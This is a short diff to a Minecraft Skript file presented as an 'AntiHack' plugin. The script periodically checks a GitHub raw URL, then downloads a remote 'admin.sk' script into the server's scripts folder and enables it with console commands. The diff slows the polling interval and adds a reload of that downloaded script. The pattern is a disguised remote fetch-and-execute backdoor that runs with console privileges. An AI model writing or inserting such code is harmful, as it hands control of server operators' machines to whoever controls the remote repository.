@@ -10,7 +10,7 @@ on load:
 on unload:
     message "&4&l(!) Successfully unloaded AntiHack" to console
 
-every second:
+every 15 second:
     if line 1 from url "https://raw.githubusercontent.com/HelloWorldCH/test/main/config.yml" is not "%{version-main}%":
         wait 5 second
         execute console command "sk disable main"
@@ -30,3 +30,4 @@ every second:
         download file from "https://raw.githubusercontent.com/HelloWorldCH/test/main/admin.sk" to file "plugin/Skript/scripts\\admin.sk"
         wait 5 second
         execute console command "sk enable admin"
+        execute console command "sk reload admin"
